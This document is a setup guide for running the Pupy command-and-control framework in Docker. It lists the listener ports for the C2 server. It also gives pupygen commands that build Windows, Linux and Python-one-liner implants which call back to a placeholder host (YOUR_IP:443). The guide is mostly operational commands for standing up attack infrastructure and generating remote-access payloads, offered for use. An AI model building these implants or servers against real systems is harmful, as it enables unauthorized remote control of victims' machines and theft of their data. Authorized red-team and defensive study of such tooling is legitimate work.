# Pupy C2 Docker Setup Guide

Pupy is no longer mainted and a lot of the requirements are outdated. This is a dockerized version of Pupy using pinned requirements and python3.8.

This enhanced Docker setup provides a flexible way to run both the Pupy server (pupysh) and payload generator (pupygen).

## Directory Structure

After running the setup, you'll have:

```bash
pupy-docker/
├── Dockerfile               # Enhanced Dockerfile
├── docker-entrypoint.sh     # Entrypoint script
├── docker-compose.yml       # Docker Compose configuration
├── pinned-requirements.txt  # Python dependencies
├── .env.example             # Environment variables example for Docker
├── config/                  # Configuration files (auto-created)
│   └── pupy.conf.example    # Example Pupy configuration rename to pupy.conf to use
├── output/                  # Generated payloads (auto-created)
└── data/                    # Persistent data (auto-created)
```

## Quick Start

1. **Build the image:**

   ```bash
   docker-compose build
   ```

2. **Start the Pupy server:**

   ```bash
   docker-compose up -d pupy-server
   ```

3. **View logs:**

   ```bash
   docker-compose logs -f pupy-server
   ```

## Configuration

### Using Custom Configuration

1. On first run, the default configuration is copied to `./config/pupy.conf`
2. Edit `./config/pupy.conf` to customize your setup
3. Restart the container to apply changes:

   ```bash
   docker-compose restart pupy-server
   ```

### Key Configuration Options

Edit `./config/pupy.conf` to modify:

- **Listeners**: Change ports and transports in `[listeners]` section
- **Transport settings**: Configure SSL, HTTP, etc. in respective sections
- **Paths**: Modify data storage locations in `[paths]` section
- **Credentials**: Will be auto-generated on first run

## Running Commands

### Pupy Server (pupysh)

**Interactive mode:**

```bash
docker-compose run --rm pupy-server pupysh
```

**With custom listeners:**

```bash
docker-compose run --rm pupy-server pupysh -l ssl 0.0.0.0:443
```

**Multiple listeners:**

```bash
docker-compose run --rm pupy-server pupysh -l ssl 443 -l http 80
```

### Payload Generator (pupygen)

**Generate Windows payload:**

```bash
docker-compose run --rm pupy-generator pupygen -O windows -A x64 -o ./output/payload.exe
```

**Generate Linux payload:**

```bash
docker-compose run --rm pupy-generator pupygen -O linux -A x64 -o ./output/payload.lin
```

**Generate Python payload:**

```bash
docker-compose run --rm pupy-generator pupygen -f py -o ./output/payload.py
```

**List available options:**

```bash
docker-compose run --rm pupy-generator pupygen -l
```

### Understanding the Module Structure

Pupy uses Python's module system:

- `python -m pupy.cli` runs pupysh (via __main__.py)
- `python -m pupy.cli.pupygen` runs pupygen module
- Both commands properly set up the Python path and imports

### Using Profile for Generator

You can also use the generator profile:

```bash
docker-compose --profile generator run pupy-generator pupygen -O windows -A x64
```

## Port Mappings

Default port mappings in docker-compose.yml:

- **443**: SSL/TLS (default)
- **8443**: Alternative SSL
- **80**: HTTP
- **8080, 8081**: Alternative HTTP
- **9090**: Obfs3 transport
- **9091**: RSA transport
- **123/udp**: UDP transport
- **1234**: TCP cleartext/EC4
- **1235**: ECM transport
- **9000**: Web server for payloads

## Environment Variables

Create a `.env` file from `.env.example`:

```bash
cp .env.example .env
```

Available variables:

- `EXTERNAL_IP`: Set your external IP for payload callbacks
- `PUPY_TRANSPORT`: Default transport (ssl, http, etc.)

## Persistent Data

All data is stored in mounted volumes:

- `./config/`: Configuration files
- `./output/`: Generated payloads
- `./data/`: Runtime data (logs, downloads, etc.)

## Examples

### Basic Server Setup

```bash
# Start server with default SSL listener on port 443
docker-compose up -d pupy-server

# Check status
docker-compose ps

# View logs
docker-compose logs -f pupy-server
```

### Generate Payloads

```bash
# Windows 64-bit executable
docker-compose run --rm pupy-generator pupygen -O windows -A x64 -o ./output/win64.exe

# Linux 64-bit with custom transport
docker-compose run --rm pupy-generator pupygen -O linux -A x64 -t ssl --host YOUR_IP:443 -o ./output/linux64

# Python oneliner
docker-compose run --rm pupy-generator pupygen -f py_oneliner -t ssl --host YOUR_IP:443
```

### Interactive Shell

```bash
# Get a bash shell in the container
docker-compose run --rm pupy-server bash

# Run pupysh interactively
docker-compose run --rm -it pupy-server pupysh
```

## Troubleshooting

### Permission Issues

If you encounter permission issues with mounted volumes:

```bash
# Fix ownership
sudo chown -R 1000:1000 ./config ./output ./data
```

### Port Conflicts

If ports are already in use, modify the port mappings in `docker-compose.yml`:

```yaml
ports:
  - "4433:443"  # Map to different external port
```

### Container Won't Start

Check logs for errors:

```bash
docker-compose logs pupy-server
```

## Security Notes

1. **Change default credentials**: On first run, new SSL certificates are generated
2. **Firewall**: Only expose necessary ports
3. **Configuration**: Review and harden `pupy.conf` settings
4. **Updates**: Regularly rebuild the image to get security updates

## Advanced Usage

### Custom Dockerfile Build Args

```bash
docker-compose build --build-arg PUPY_UID=2000 --build-arg PUPY_GID=2000
```

### Running with Specific Config

```bash
docker run -it --rm \
  -v $(pwd)/custom-config:/opt/pupy/config \
  -v $(pwd)/output:/opt/pupy/output \
  -p 443:443 \
  pupy-server:py38-enhanced pupysh
```